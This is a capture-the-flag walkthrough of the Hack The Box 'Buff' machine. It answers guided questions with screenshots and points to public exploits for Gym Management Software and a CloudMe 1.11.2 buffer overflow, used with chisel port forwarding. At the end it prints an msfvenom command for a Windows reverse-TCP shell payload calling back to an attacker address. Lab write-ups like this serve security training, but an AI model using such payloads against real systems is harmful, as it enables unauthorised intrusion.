# Hack The Box
## Buff Writeup (Guided Mode)

### On which TCP port is Buff hosting a website?
> ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/c0eac422-e007-44cf-91d7-404cca15ccbe)
> Port 8080 we have httpd

### Which framework is the website using? 
> ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/52036b39-9f45-4a3f-8f3e-a29b584ecbac)
> Gym Management Software

+ There is an exploit for Gym Manangement Software on Exploit-DB
+ ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/1315d846-72db-48a5-8160-af7ed9600a7d)
+ This exploit works with python2, which has been discontinued, but if you wish to install it here is the link on how to do it - https://ubuntuforums.org/showthread.php?t=2486174
+ Note: Installing python2 might change some configs for python3 so please do not do it unless you know what you are doing. If you're a newbie, create a temporary user for running the exploit.

### Which user is the website running as?
> ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/99f7ddb2-931d-4fc6-97d6-e19a05bc550c)
>  Shaun

### Submit the flag located on the shaun user's desktop.
> ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/9e15d51b-f60b-40ba-bbf2-370329c79d14)

### What is the name of an interesting binary inside the shaun user's home directory?
> ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/ba89db0d-8228-4959-bf4e-9efc81f9682d)
> CloudMe_1112.exe

### Which localhost port is the above binary listening on?
> ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/a4bae0d6-9488-43e8-9cef-a838a6a17925)
> 8888

+ I could not find the process so I had to run the exploit in another window and run two parallel commands
+ ```netstat -ano``` to list all the open ports
+ ```tasklist | find /i "CloudMe"``` to find the process id/PID of the binary

### What version of CloudMe has a buffer overflow vulnerability?
> ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/a3812c13-4393-4e03-a15e-280b652350fa)
> 1.11.2

### Submit the flag located on the administrator's desktop.
> ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/53e55423-7e30-448c-9e71-4ea0a7c4ddfd)

+ So the final part was a bit tricky because the exploit was in python and the machine has no python installed on it
+ We downloaded chisel on both attacker and victim machine (Linux for me and Windows for Buff) - https://github.com/jpillora/chisel/releases/
+ Run Chisel to forward port 8888 on my machine and then running the exploit

![image](https://github.com/brownPineapple/hackthebox/assets/30342446/978acc18-5816-4da0-9ea7-88f9de68018f)
+ Create a reverse shell payload using msfvenom as shown in the exploit
```msfvenom -a x86 -p windows/shell/reverse_tcp LHOST=10.10.14.33 LPORT=4455 -b '\x00\x0A\x0D' -f python```
+ Replace the bytes, start ncat listner and run the exploit and we get shell
